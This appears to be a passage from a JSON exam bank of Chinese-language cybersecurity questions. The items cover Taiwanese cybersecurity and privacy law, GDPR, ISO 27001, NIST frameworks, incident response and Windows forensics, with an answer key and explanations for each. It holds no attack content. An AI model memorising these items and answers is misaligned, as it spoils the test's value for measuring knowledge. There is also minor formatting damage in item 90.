      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：Volatility 的 `malfind` 插件專為尋找隱藏的注入代碼而設計。它掃描記憶體中所有具備 `PAGE_EXECUTE_READWRITE`（可讀、可寫、可執行，即 RWX 屬性）特權的記憶體分頁，且特別比對該記憶體分頁是否沒有對應到磁碟上的合法檔案。若該記憶體開頭含有 `MZ` 標頭或常見 Shellcode 彙編特徵（如 `0x55 0x8B 0xEC`），`malfind` 會立即將其轉儲報告為高度可疑的注入代碼。\n\n- **干擾項辨析**：\n\n  - (B)、(C)、(D) 均非 `malfind` 判別的核心指標。"
    },
    {
      "id": 81,
      "exam": "exam_a",
      "domain": "領域六：資安法規、標準與治理體系",
      "category": "資安法規 / 資通安全管理法主體",
      "type": "single_choice",
      "question": "依據台灣現行《資通安全管理法》，本法之中央主管機關為下列何者？",
      "options": {
        "A": "國家安全會議",
        "B": "數位發展部",
        "C": "國家通訊傳播委員會 (NCC)",
        "D": "內政部警政署"
      },
      "answer": "B",
      "basis": "依據台灣 2022 年組織改造與《資通安全管理法》最新修正，資通安全管理法之中央主管機關為**數位發展部**（國家資通安全研究院為其行政法人技術幕僚機構）。",
      "distractor": "- (A) 國家安全會議屬於總統諮詢機關，非資安法之法定行政主管機關。\n\n  - (C) NCC 為通訊傳播監理機關。\n\n  - (D) 警政署負責刑事犯罪偵查。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：依據台灣 2022 年組織改造與《資通安全管理法》最新修正，資通安全管理法之中央主管機關為**數位發展部**（國家資通安全研究院為其行政法人技術幕僚機構）。\n\n- **干擾項辨析**：\n\n  - (A) 國家安全會議屬於總統諮詢機關，非資安法之法定行政主管機關。\n\n  - (C) NCC 為通訊傳播監理機關。\n\n  - (D) 警政署負責刑事犯罪偵查。"
    },
    {
      "id": 82,
      "exam": "exam_a",
      "domain": "領域六：資安法規、標準與治理體系",
      "category": "資安法規 / 特定非公務機關涵蓋範圍",
      "type": "single_choice",
      "question": "《資通安全管理法》規範之適用對象除公務機關外，亦涵蓋「特定非公務機關」。下列哪一類組織**不屬於**該法明定之特定非公務機關？",
      "options": {
        "A": "關鍵基礎設施提供者",
        "B": "公營事業",
        "C": "政府捐助之財團法人",
        "D": "一般資本額低於新台幣一千萬元的民間中小型零售商"
      },
      "answer": "D",
      "basis": "《資通安全管理法》第 2 條與第 16 條明定，「特定非公務機關」包含三大類主體：\n\n  1. **關鍵基礎設施提供者**（如油電水、高鐵、金融核心等）；\n\n  2. **公營事業**；\n\n  3. **政府捐助之財團法人**。  \n\n  一般民間中小型零售商不屬於特定非公務機關之法定範圍（其受個人資料保護法規範，而非資安法直接納管）。",
      "distractor": "- (A)、(B)、(C) 均為法定特定非公務機關。",
      "full_solution": "- **正確答案**：**(D)**\n\n- **正解依據**：《資通安全管理法》第 2 條與第 16 條明定，「特定非公務機關」包含三大類主體：\n\n  1. **關鍵基礎設施提供者**（如油電水、高鐵、金融核心等）；\n\n  2. **公營事業**；\n\n  3. **政府捐助之財團法人**。  \n\n  一般民間中小型零售商不屬於特定非公務機關之法定範圍（其受個人資料保護法規範，而非資安法直接納管）。\n\n- **干擾項辨析**：\n\n  - (A)、(B)、(C) 均為法定特定非公務機關。"
    },
    {
      "id": 83,
      "exam": "exam_a",
      "domain": "領域六：資安法規、標準與治理體系",
      "category": "資安法規 / 資通安全責任等級分級",
      "type": "single_choice",
      "question": "依《資通安全責任等級分級辦法》，公務機關與特定非公務機關之資安責任等級劃分為 A、B、C、D、E 五級。下列何者為最高等級「A 級機關」的典型代表？",
      "options": {
        "A": "總統府、行政院、外交部、國防部等國家重大政務或涉及全國性關鍵資訊基礎設施主管機關",
        "B": "鄉鎮市公所與鄉立圖書館",
        "C": "僅維護單一地方性文化活動網站的機構",
        "D": "私立專科學校"
      },
      "answer": "A",
      "basis": "依《資通安全責任等級分級辦法》，責任等級分為 A、B、C、D、E 五級。其中 **A 級機關**具有全國最高資安責任要求，涵蓋：總統府、行政院、國家安全局、涉及全國性關鍵基礎設施或涉及國家核心機密的中央主管部會（如國防部、外交部等）。",
      "distractor": "- (B) 鄉鎮市公所通常為 D 級或 C 級機關。\n\n  - (C) 僅維護單一活動網站者通常為 D 級或 E 級。\n\n  - (D) 私立專科學校若非主管機關指定通常為 C 級以下。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：依《資通安全責任等級分級辦法》，責任等級分為 A、B、C、D、E 五級。其中 **A 級機關**具有全國最高資安責任要求，涵蓋：總統府、行政院、國家安全局、涉及全國性關鍵基礎設施或涉及國家核心機密的中央主管部會（如國防部、外交部等）。\n\n- **干擾項辨析**：\n\n  - (B) 鄉鎮市公所通常為 D 級或 C 級機關。\n\n  - (C) 僅維護單一活動網站者通常為 D 級或 E 級。\n\n  - (D) 私立專科學校若非主管機關指定通常為 C 級以下。"
    },
    {
      "id": 84,
      "exam": "exam_a",
      "domain": "領域六：資安法規、標準與治理體系",
      "category": "資安法規 / 資安事件通報時限",
      "type": "single_choice",
      "question": "依據台灣《資通安全事件通報及應變辦法》，公務機關或特定非公務機關知悉發生第三級或第四級重大資通安全事件時，應於知悉後多久時限內向主管機關完成通報？",
      "options": {
        "A": "1 小時內",
        "B": "24 小時內",
        "C": "36 小時內",
        "D": "72 小時內"
      },
      "answer": "A",
      "basis": "依據台灣《資通安全事件通報及應變辦法》，公務機關或特定非公務機關知悉資通安全事件時，不論事件等級（第一級至第四級），均必須於**知悉後 1 小時內**向主管機關（數位發展部資安通報平台）完成通報。",
      "distractor": "- (B)、(C)、(D) 均非初次通報法定期限。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：依據台灣《資通安全事件通報及應變辦法》，公務機關或特定非公務機關知悉資通安全事件時，不論事件等級（第一級至第四級），均必須於**知悉後 1 小時內**向主管機關（數位發展部資安通報平台）完成通報。\n\n- **干擾項辨析**：\n\n  - (B)、(C)、(D) 均非初次通報法定期限。"
    },
    {
      "id": 85,
      "exam": "exam_a",
      "domain": "領域六：資安法規、標準與治理體系",
      "category": "資安法規 / 資安事件復原時限",
      "type": "single_choice",
      "question": "承上題，機關知悉資通安全事件後，針對第三級或第四級事件，應於知悉後多久時限內完成事件損害控制或復原作業，並送交主管機關備查？",
      "options": {
        "A": "12 小時內",
        "B": "24 小時內",
        "C": "36 小時內",
        "D": "72 小時內"
      },
      "answer": "C",
      "basis": "依據《資通安全事件通報及應變辦法》第 6 條：\n\n  - 第一級或第二級資通安全事件：應於知悉後 **72 小時內**完成損害控制或復原作業；\n\n  - **第三級或第四級重大資通安全事件**：因其牽涉關鍵核心系統中斷或國家機密洩漏，法定期限更加嚴格，必須於知悉後 **36 小時內**完成損害控制或復原作業。",
      "distractor": "- (A) 12 小時非法定期限。\n\n  - (B) 24 小時非法定期限。\n\n  - (D) 72 小時是一、二級事件的復原時限。",
      "full_solution": "- **正確答案**：**(C)**\n\n- **正解依據**：依據《資通安全事件通報及應變辦法》第 6 條：\n\n  - 第一級或第二級資通安全事件：應於知悉後 **72 小時內**完成損害控制或復原作業；\n\n  - **第三級或第四級重大資通安全事件**：因其牽涉關鍵核心系統中斷或國家機密洩漏，法定期限更加嚴格，必須於知悉後 **36 小時內**完成損害控制或復原作業。\n\n- **干擾項辨析**：\n\n  - (A) 12 小時非法定期限。\n\n  - (B) 24 小時非法定期限。\n\n  - (D) 72 小時是一、二級事件的復原時限。"
    },
    {
      "id": 86,
      "exam": "exam_a",
      "domain": "領域六：資安法規、標準與治理體系",
      "category": "個人資料保護 / 特種個資範圍",
      "type": "single_choice",
      "question": "依據台灣《個人資料保護法》第 6 條規定，下列哪一項**不屬於**法律明文保護之特種（敏感）個人資料，其原則上不得任意蒐集、處理或利用？",
      "options": {
        "A": "病歷與醫療資料",
        "B": "基因與性生活資料",
        "C": "犯罪前科資料",
        "D": "電子郵件地址與公開社群帳號"
      },
      "answer": "D",
      "basis": "台灣《個人資料保護法》第 6 條明文規範特種個人資料（敏感個資）僅有六項：**病歷、醫療、基因、性生活、健康檢查及犯罪前科**。這六類特種個資原則上不得蒐集、處理或利用，除非符合特定法定豁免條件。電子郵件地址屬於一般個資，非特種個資。",
      "distractor": "- (A)、(B)、(C) 均為法定特種個資。",
      "full_solution": "- **正確答案**：**(D)**\n\n- **正解依據**：台灣《個人資料保護法》第 6 條明文規範特種個人資料（敏感個資）僅有六項：**病歷、醫療、基因、性生活、健康檢查及犯罪前科**。這六類特種個資原則上不得蒐集、處理或利用，除非符合特定法定豁免條件。電子郵件地址屬於一般個資，非特種個資。\n\n- **干擾項辨析**：\n\n  - (A)、(B)、(C) 均為法定特種個資。"
    },
    {
      "id": 87,
      "exam": "exam_a",
      "domain": "領域六：資安法規、標準與治理體系",
      "category": "國際隱私法規 / GDPR 規範",
      "type": "single_choice",
      "question": "歐洲聯盟《一般資料保護規則》（GDPR）被公認為全球最嚴格之隱私保護標準。其中規定資料當事人有權要求資料控制者無條件刪除其個人資料的權利，稱之為何？",
      "options": {
        "A": "被遺忘權（Right to be Forgotten / Right to Erasure）",
        "B": "資料可攜權（Right to Data Portability）",
        "C": "拒絕權（Right to Object）",
        "D": "知情權（Right to be Informed）"
      },
      "answer": "A",
      "basis": "歐盟 GDPR 第 17 條規範的是「被遺忘權」（Right to be Forgotten），正式法條名稱為「刪除權」（Right to Erasure）。資料當事人有權要求資料控制者在其個人資料已無原蒐集目的必要、或撤回同意時，刪除其相關個人資料並停止擴散。",
      "distractor": "- (B) 資料可攜權（GDPR 第 20 條）指要求將資料以結構化常見格式傳輸給另一個控制者。\n\n  - (C) 拒絕權（第 21 條）指拒絕用於直接行銷或特定處理。\n\n  - (D) 知情權（第 13、14 條）指被告知資料處理之權利。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：歐盟 GDPR 第 17 條規範的是「被遺忘權」（Right to be Forgotten），正式法條名稱為「刪除權」（Right to Erasure）。資料當事人有權要求資料控制者在其個人資料已無原蒐集目的必要、或撤回同意時，刪除其相關個人資料並停止擴散。\n\n- **干擾項辨析**：\n\n  - (B) 資料可攜權（GDPR 第 20 條）指要求將資料以結構化常見格式傳輸給另一個控制者。\n\n  - (C) 拒絕權（第 21 條）指拒絕用於直接行銷或特定處理。\n\n  - (D) 知情權（第 13、14 條）指被告知資料處理之權利。"
    },
    {
      "id": 88,
      "exam": "exam_a",
      "domain": "領域六：資安法規、標準與治理體系",
      "category": "國際資安標準 / ISO 27001:2022 架構",
      "type": "single_choice",
      "question": "最新版 ISO/IEC 27001:2022 標準將附錄 A（Annex A）的資安控制項精簡整合為四大主題領域。下列何者**不屬於**這四大主題？",
      "options": {
        "A": "組織控制措施（Organizational controls）",
        "B": "人員控制措施（People controls）",
        "C": "實體控制措施（Physical controls）",
        "D": "雲端虛擬控制措施（Cloud virtual controls）"
      },
      "answer": "D",
      "basis": "ISO/IEC 27001:2022（新版標準）將舊版的 14 個控制領域簡化並整編為**四大主題（Themes）**：\n\n  1. **組織控制措施（Organizational controls）** - 37 項；\n\n  2. **人員控制措施（People controls）** - 8 項；\n\n  3. **實體控制措施（Physical controls）** - 14 項；\n\n  4. **技術控制措施（Technological controls）** - 34 項。  \n\n  不存在「雲端虛擬控制措施」這個獨立主題。",
      "distractor": "- (A)、(B)、(C) 均為 2022 版標準的法定四大主題之一。",
      "full_solution": "- **正確答案**：**(D)**\n\n- **正解依據**：ISO/IEC 27001:2022（新版標準）將舊版的 14 個控制領域簡化並整編為**四大主題（Themes）**：\n\n  1. **組織控制措施（Organizational controls）** - 37 項；\n\n  2. **人員控制措施（People controls）** - 8 項；\n\n  3. **實體控制措施（Physical controls）** - 14 項；\n\n  4. **技術控制措施（Technological controls）** - 34 項。  \n\n  不存在「雲端虛擬控制措施」這個獨立主題。\n\n- **干擾項辨析**：\n\n  - (A)、(B)、(C) 均為 2022 版標準的法定四大主題之一。"
    },
    {
      "id": 89,
      "exam": "exam_a",
      "domain": "領域六：資安法規、標準與治理體系",
      "category": "資安框架 / NIST CSF 2.0 核心功能",
      "type": "single_choice",
      "question": "美國國家標準與技術研究院（NIST）於 2024 年正式發布網路安全框架 2.0（CSF 2.0）。相較於先前的五大功能，CSF 2.0 全新新增了哪一個居於核心統籌地位的第六大核心功能？",
      "options": {
        "A": "治理（Govern, GV）",
        "B": "審計（Audit, AU）",
        "C": "封鎖（Block, BL）",
        "D": "預測（Predict, PR）"
      },
      "answer": "A",
      "basis": "NIST 於 2024 年發布的 Cybersecurity Framework 2.0（CSF 2.0），在原有的五大功能（Identify, Protect, Detect, Respond, Recover）之上，重磅新增了第六大功能——**治理（Govern, GV）**。Govern 貫穿整個資安策略、角色權責、風險管理與供應鏈監督，居於引領地位。",
      "distractor": "- (B)、(C)、(D) 均非 NIST CSF 2.0 的核心功能分類。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：NIST 於 2024 年發布的 Cybersecurity Framework 2.0（CSF 2.0），在原有的五大功能（Identify, Protect, Detect, Respond, Recover）之上，重磅新增了第六大功能——**治理（Govern, GV）**。Govern 貫穿整個資安策略、角色權責、風險管理與供應鏈監督，居於引領地位。\n\n- **干擾項辨析**：\n\n  - (B)、(C)、(D) 均非 NIST CSF 2.0 的核心功能分類。"
    },
    {
      "id": 90,
      "exam": "exam_a",
      "domain": "領域六：資安法規、標準與治理體系",
      "category": "資訊架構 / 零信任架構 ZTA 原則",
      "type": "single_choice",
      "question": "依據 NIST SP 800-207《零信任架構》（Zero Trust Architecture），零信任安全的核心設計哲學為何？",
      "options": {
        "A": "假設內網完全安全，僅防禦外網威脅",
        "B": "「永不信任，始終驗證」（Never Trust, Always Verify），預設所有網路流量與存取主體皆具潛在威脅，對所有資產與請求強制進行最小權限持續認證授權",
        "C": "只要通過 VPN 連線即視為內部信任節點",
        "D": "全面停用雲端服務，所有系統回遷地端機房  \n\n\n\n---\n\n\n\n## 領域七：資安事件應變與數位鑑識 (第 91 ~ 100 題)"
      },
      "answer": "B",
      "basis": "NIST SP 800-207《零信任架構》打破了傳統以實體邊界為基礎的「內網信任、外網防範」城堡模型。其根本宗旨為「**永不信任，始終驗證**」（Never Trust, Always Verify）。預設網路內外無一處是安全的，無論請求來自內網還是外網，均需對使用者身分、設備狀態、存取環境進行多維度動態持續認證授權，並貫徹最小權限存取。",
      "distractor": "- (A)、(C) 為已遭淘汰的傳統周界防禦思維。\n\n  - (D) 與零信任理念無關，零信任極為適配雲端與混合架構。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：NIST SP 800-207《零信任架構》打破了傳統以實體邊界為基礎的「內網信任、外網防範」城堡模型。其根本宗旨為「**永不信任，始終驗證**」（Never Trust, Always Verify）。預設網路內外無一處是安全的，無論請求來自內網還是外網，均需對使用者身分、設備狀態、存取環境進行多維度動態持續認證授權，並貫徹最小權限存取。\n\n- **干擾項辨析**：\n\n  - (A)、(C) 為已遭淘汰的傳統周界防禦思維。\n\n  - (D) 與零信任理念無關，零信任極為適配雲端與混合架構。"
    },
    {
      "id": 91,
      "exam": "exam_a",
      "domain": "領域七：資安事件應變與數位鑑識",
      "category": "事件應變 / NIST SP 800-61 六階段流程",
      "type": "single_choice",
      "question": "依據 NIST SP 800-61 建議之電腦安全事件處理流程，標準的事件應變週期順序為何？",
      "options": {
        "A": "準備 -> 偵測與分析 -> 圍堵、根除與復原 -> 事後活動",
        "B": "偵測 -> 通報 -> 提告 -> 復原",
        "C": "圍堵 -> 分析 -> 備份 -> 終止服務",
        "D": "事後學習 -> 預警 -> 防禦 -> 報案"
      },
      "answer": "A",
      "basis": "NIST SP 800-61（電腦安全事件處理指南）將事件應變生命週期劃分為四個核心階段（常拆分為六步）：\n\n  1. **Preparation（準備階段）**\n\n  2. **Detection and Analysis（偵測與分析階段）**\n\n  3. **Containment, Eradication, and Recovery（圍堵、根除與復原階段）**\n\n  4. **Post-Incident Activity（事後活動 / 事後學習檢討）**",
      "distractor": "- (B)、(C)、(D) 均非國際標準事件應變流程順序。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：NIST SP 800-61（電腦安全事件處理指南）將事件應變生命週期劃分為四個核心階段（常拆分為六步）：\n\n  1. **Preparation（準備階段）**\n\n  2. **Detection and Analysis（偵測與分析階段）**\n\n  3. **Containment, Eradication, and Recovery（圍堵、根除與復原階段）**\n\n  4. **Post-Incident Activity（事後活動 / 事後學習檢討）**\n\n- **干擾項辨析**：\n\n  - (B)、(C)、(D) 均非國際標準事件應變流程順序。"
    },
    {
      "id": 92,
      "exam": "exam_a",
      "domain": "領域七：資安事件應變與數位鑑識",
      "category": "數位取證 / RFC 3227 揮發性資料順序",
      "type": "single_choice",
      "question": "數位鑑識人員在現場獲取證據時，必須嚴格遵循 RFC 3227《數位證據收集與存檔指引》所定義的「證據揮發性順序」（Order of Volatility）。下列各類存儲媒介中，哪一個應**最優先**進行採證收集？",
      "options": {
        "A": "磁碟映像檔（Hard Disk / SSD）",
        "B": "CPU 快取、暫存器與實體記憶體（RAM）",
        "C": "網路連線狀態與行程表",
        "D": "光碟與磁帶備份媒體"
      },
      "answer": "B",
      "basis": "RFC 3227 明確規範了證據收集的揮發性順序（Order of Volatility，從最易遺失到最持久）：\n\n  1. CPU 暫存器、快取記憶體（Registers, Cache）；\n\n  2. 路由表、ARP 快取、處理序表、主記憶體（RAM）；\n\n  3. 暫存檔案系統（Temporary File Systems / Swap）；\n\n  4. 磁碟（Disk / SSD）；\n\n  5. 遠端日誌與網路拓撲；\n\n  6. 實體備份媒體（CD-ROM, Tapes）。  \n\n  一旦關機，記憶體與暫存器資料瞬間消失且不可逆，因此必須最優先收集！",
      "distractor": "- (A)、(C)、(D) 揮發性均低於 CPU 暫存器與 RAM。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：RFC 3227 明確規範了證據收集的揮發性順序（Order of Volatility，從最易遺失到最持久）：\n\n  1. CPU 暫存器、快取記憶體（Registers, Cache）；\n\n  2. 路由表、ARP 快取、處理序表、主記憶體（RAM）；\n\n  3. 暫存檔案系統（Temporary File Systems / Swap）；\n\n  4. 磁碟（Disk / SSD）；\n\n  5. 遠端日誌與網路拓撲；\n\n  6. 實體備份媒體（CD-ROM, Tapes）。  \n\n  一旦關機，記憶體與暫存器資料瞬間消失且不可逆，因此必須最優先收集！\n\n- **干擾項辨析**：\n\n  - (A)、(C)、(D) 揮發性均低於 CPU 暫存器與 RAM。"
    },
    {
      "id": 93,
      "exam": "exam_a",
      "domain": "領域七：資安事件應變與數位鑑識",
      "category": "記憶體鑑識 / Volatility 3 核心插件",
      "type": "single_choice",
      "question": "在記憶體鑑識分析中，鑑識人員使用 Volatility 3 分析 Windows 記憶體轉儲檔（memory dump）。若想要「列出記憶體中所有活動的行程清單及其父行程 PID（PPID）」，應執行哪一個插件？",
      "options": {
        "A": "`windows.pslist`",
        "B": "`windows.netscan`",
        "C": "`windows.filescan`",
        "D": "`windows.hashdump`"
      },
      "answer": "A",
      "basis": "在 Volatility 3 中：\n\n  - `windows.pslist`：透過遍歷核心中的雙向鏈表 `ActiveProcessLinks`，列出記憶體中所有正在執行的進程名稱、PID、PPID（父進程 PID）、執行緒數與啟動時間戳。",
      "distractor": "- (B) `windows.netscan` 用於掃描網路連線（TCP/UDP 連線端點與 PID）。\n\n  - (C) `windows.filescan` 用於搜尋記憶體中的檔案物件。\n\n  - (D) `windows.hashdump` 用於提取本機 SAM 帳號密碼雜湊。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：在 Volatility 3 中：\n\n  - `windows.pslist`：透過遍歷核心中的雙向鏈表 `ActiveProcessLinks`，列出記憶體中所有正在執行的進程名稱、PID、PPID（父進程 PID）、執行緒數與啟動時間戳。\n\n- **干擾項辨析**：\n\n  - (B) `windows.netscan` 用於掃描網路連線（TCP/UDP 連線端點與 PID）。\n\n  - (C) `windows.filescan` 用於搜尋記憶體中的檔案物件。\n\n  - (D) `windows.hashdump` 用於提取本機 SAM 帳號密碼雜湊。"
    },
    {
      "id": 94,
      "exam": "exam_a",
      "domain": "領域七：資安事件應變與數位鑑識",
      "category": "記憶體鑑識 / 隱藏行程檢測",
      "type": "single_choice",
      "question": "惡意 Rootkit 常透過修改雙向進程活動鏈表（DKOM 技術）將自身行程隱匿，使其不顯示於工作管理員中。在 Volatility 中，哪一個插件能同時對比多個子系統指針，專門用於揪出被 DKOM 技術斷鏈隱藏的惡意進程？",
      "options": {
        "A": "`windows.psscan` (或 `windows.psxview`)",
        "B": "`windows.cmdline`",
        "C": "`windows.envars`",
        "D": "`windows.handles`"
      },
      "answer": "A",
      "basis": "Rootkit 常使用直接核心物件修改（Direct Kernel Object Manipulation, DKOM），將惡意進程從 `ActiveProcessLinks` 鏈表中摘除（Unlink）。此時 `pslist` 無法顯示該進程。而 `windows.psscan` 透過搜尋整個記憶體池中的 `EPROCESS` 結構池標籤（Pool Tags），`windows.psxview` 則交叉對比多個子系統指針（如 CSRSS、PspCidTable、執行緒線索），從而精準揪出被斷鏈隱匿的進程。",
      "distractor": "- (B) `cmdline` 列出命令列參數。\n\n  - (C) `envars` 列出環境變數。\n\n  - (D) `handles` 列出開啟的物件控制代碼。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：Rootkit 常使用直接核心物件修改（Direct Kernel Object Manipulation, DKOM），將惡意進程從 `ActiveProcessLinks` 鏈表中摘除（Unlink）。此時 `pslist` 無法顯示該進程。而 `windows.psscan` 透過搜尋整個記憶體池中的 `EPROCESS` 結構池標籤（Pool Tags），`windows.psxview` 則交叉對比多個子系統指針（如 CSRSS、PspCidTable、執行緒線索），從而精準揪出被斷鏈隱匿的進程。\n\n- **干擾項辨析**：\n\n  - (B) `cmdline` 列出命令列參數。\n\n  - (C) `envars` 列出環境變數。\n\n  - (D) `handles` 列出開啟的物件控制代碼。"
    },
    {
      "id": 95,
      "exam": "exam_a",
      "domain": "領域七：資安事件應變與數位鑑識",
      "category": "Windows取證 / 安全事件日誌 Event ID",
      "type": "single_choice",
      "question": "在調查 Windows 伺服器遭受滲透時，安全日誌（Security.evtx）至關重要。哪一個 Event ID 代表「帳戶成功登入」（An account was successfully logged on）？",
      "options": {
        "A": "4624",
        "B": "4625",
        "C": "4720",
        "D": "7045"
      },
      "answer": "A",
      "basis": "Windows Security.evtx 核心事件代碼必背：\n\n  - **4624**：帳戶**成功**登入（An account was successfully logged on）；\n\n  - **4625**：帳戶**登入失敗**（An account failed to log on，爆破攻擊指標）；\n\n  - **4720**：建立了新使用者帳戶；\n\n  - **7045**：系統安裝了新服務（常見於持久化木馬）。",
      "distractor": "- (B) 4625 是登入失敗。\n\n  - (C) 4720 是建立帳戶。\n\n  - (D) 7045 是新增服務。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：Windows Security.evtx 核心事件代碼必背：\n\n  - **4624**：帳戶**成功**登入（An account was successfully logged on）；\n\n  - **4625**：帳戶**登入失敗**（An account failed to log on，爆破攻擊指標）；\n\n  - **4720**：建立了新使用者帳戶；\n\n  - **7045**：系統安裝了新服務（常見於持久化木馬）。\n\n- **干擾項辨析**：\n\n  - (B) 4625 是登入失敗。\n\n  - (C) 4720 是建立帳戶。\n\n  - (D) 7045 是新增服務。"
    },
    {
      "id": 96,
      "exam": "exam_a",
      "domain": "領域七：資安事件應變與數位鑑識",
      "category": "Windows取證 / 登入類型 Logon Type",
      "type": "single_choice",
      "question": "承上題，若在 Windows Event ID 4624 的詳細資訊中，觀察到 `Logon Type: 10`，這代表該登入是透過下列哪一種方式進行的？",
      "options": {
        "A": "本機鍵盤滑鼠互動登入（Interactive）",
        "B": "網路連線共用目錄登入（Network, 如 SMB/IPC$）",
        "C": "遠端桌面連線登入（RemoteInteractive / RDP）",
        "D": "系統服務啟動登入（Service）"
      },
      "answer": "C",
      "basis": "Windows Event 4624 的 Logon Type 欄位定義：\n\n  - **Type 2**：Interactive（本機鍵盤滑鼠互動登入）；\n\n  - **Type 3**：Network（透過網路存取，如 SMB 檔案共享、IPC$）；\n\n  - **Type 4**：Batch（批次任務）；\n\n  - **Type 5**：Service（服務啟動）；\n\n  - **Type 7**：Unlock（解鎖工作站）；\n\n  - **Type 10**：**RemoteInteractive（遠端互動 / RDP 遠端桌面連線）**。",
      "distractor": "- (A) 本機互動登入是 Type 2。\n\n  - (B) 網路連線登入是 Type 3。\n\n  - (D) 服務啟動登入是 Type 5。",
      "full_solution": "- **正確答案**：**(C)**\n\n- **正解依據**：Windows Event 4624 的 Logon Type 欄位定義：\n\n  - **Type 2**：Interactive（本機鍵盤滑鼠互動登入）；\n\n  - **Type 3**：Network（透過網路存取，如 SMB 檔案共享、IPC$）；\n\n  - **Type 4**：Batch（批次任務）；\n\n  - **Type 5**：Service（服務啟動）；\n\n  - **Type 7**：Unlock（解鎖工作站）；\n\n  - **Type 10**：**RemoteInteractive（遠端互動 / RDP 遠端桌面連線）**。\n\n- **干擾項辨析**：\n\n  - (A) 本機互動登入是 Type 2。\n\n  - (B) 網路連線登入是 Type 3。\n\n  - (D) 服務啟動登入是 Type 5。"
    },
    {
      "id": 97,
      "exam": "exam_a",
      "domain": "領域七：資安事件應變與數位鑑識",
      "category": "Windows取證 / 預取檔案 Prefetch",
      "type": "single_choice",
      "question": "Windows 系統的 Prefetch 檔案（位於 `C:\\Windows\\Prefetch\\`，副檔名為 `.pf`）在數位鑑識中提供了極具價值的證據。Prefetch 檔案能提供鑑識人員確認下列哪一項關鍵資訊？",
      "options": {
        "A": "該應用程式最近的執行時間、執行次數與該程式所加載的 DLL 清單",
        "B": "使用者在該程式內輸入的明文密碼",
        "C": "程式向外發送的所有 HTTP 封包內容",
        "D": "該程式的原始原始碼"
      },
      "answer": "A",
      "basis": "Windows 為了加速程式啟動效率，內建了預取（Prefetch）機制。每當可執行檔執行時，系統會在 `C:\\Windows\\Prefetch` 生成一個 `.pf` 檔案。鑑識人員透過解析 Prefetch 檔案，可以確鑿證明：\n\n  1. 該程式**確實曾在該系統上執行過**；\n\n  2. 該程式最後執行的具體時間戳（最多記錄最近 8 次執行時間）；\n\n  3. 該程式累計執行總次數；\n\n  4. 該程式執行前 10 秒內所加載的所有檔案與 DLL 清單。",
      "distractor": "- (B)、(C)、(D) Prefetch 均不包含這些內容。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：Windows 為了加速程式啟動效率，內建了預取（Prefetch）機制。每當可執行檔執行時，系統會在 `C:\\Windows\\Prefetch` 生成一個 `.pf` 檔案。鑑識人員透過解析 Prefetch 檔案，可以確鑿證明：\n\n  1. 該程式**確實曾在該系統上執行過**；\n\n  2. 該程式最後執行的具體時間戳（最多記錄最近 8 次執行時間）；\n\n  3. 該程式累計執行總次數；\n\n  4. 該程式執行前 10 秒內所加載的所有檔案與 DLL 清單。\n\n- **干擾項辨析**：\n\n  - (B)、(C)、(D) Prefetch 均不包含這些內容。"
    },
    {
      "id": 98,
      "exam": "exam_a",
      "domain": "領域七：資安事件應變與數位鑑識",
      "category": "檔案系統取證 / NTFS 主檔案表 $MFT",
      "type": "single_choice",
      "question": "在 NTFS 檔案系統中，每個檔案的元數據（Metadata）均存放在 `$MFT` 中。其中記錄了「檔案建立時間、最後修改時間、MFT修改時間、最後存取時間」（即 MACB 時間戳）的標準屬性為何？",
      "options": {
        "A": "`$STANDARD_INFORMATION` (0x10) 與 `$FILE_NAME` (0x30)",
        "B": "`$DATA` (0x80)",
        "C": "`$BITMAP` (0xB0)",
        "D": "`$INDEX_ROOT` (0x90)"
      },
      "answer": "A",
      "basis": "在 NTFS 的 `$MFT` 記錄中，有兩處存放時間戳（Created, Modified, MFT Modified, Accessed）：\n\n  1. `$STANDARD_INFORMATION`（屬性標識 `0x10`）：常規屬性，Windows 檔案總管與常規 API 顯示的時間來自於此；\n\n  2. `$FILE_NAME`（屬性標識 `0x30`）：記錄檔名資訊，其內部同樣保存了一套時間戳。",
      "distractor": "- (B) `$DATA` 存放檔案實際資料內容。\n\n  - (C) `$BITMAP` 記錄簇的使用狀態。\n\n  - (D) `$INDEX_ROOT` 用於目錄 B-Tree 索引。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：在 NTFS 的 `$MFT` 記錄中，有兩處存放時間戳（Created, Modified, MFT Modified, Accessed）：\n\n  1. `$STANDARD_INFORMATION`（屬性標識 `0x10`）：常規屬性，Windows 檔案總管與常規 API 顯示的時間來自於此；\n\n  2. `$FILE_NAME`（屬性標識 `0x30`）：記錄檔名資訊，其內部同樣保存了一套時間戳。\n\n- **干擾項辨析**：\n\n  - (B) `$DATA` 存放檔案實際資料內容。\n\n  - (C) `$BITMAP` 記錄簇的使用狀態。\n\n  - (D) `$INDEX_ROOT` 用於目錄 B-Tree 索引。"
    },
    {
      "id": 99,
      "exam": "exam_a",
      "domain": "領域七：資安事件應變與數位鑑識",
      "category": "數位鑑識 / 證據監管鏈 Chain of Custody",
      "type": "single_choice",
      "question": "數位證據要能具備法庭訴訟之證據能力（Admissibility），鑑識人員必須建立嚴謹的「證據監管鏈」（Chain of Custody）。下列哪一項做法會**破壞**證據監管鏈之完整性？",
      "options": {
        "A": "採證前先對目標硬碟進行物理寫入保護（Write Blocker）",
        "B": "製作硬碟鏡像後，計算 SHA-256 雜湊值並留存書面紀錄",
        "C": "鑑識人員直接在原始扣押的受害伺服器主機上開機並安裝鑑識軟體進行除錯分析",
        "D": "每次證據移轉均詳細記錄日期、經手人、目的與簽署確認"
      },
      "answer": "C",
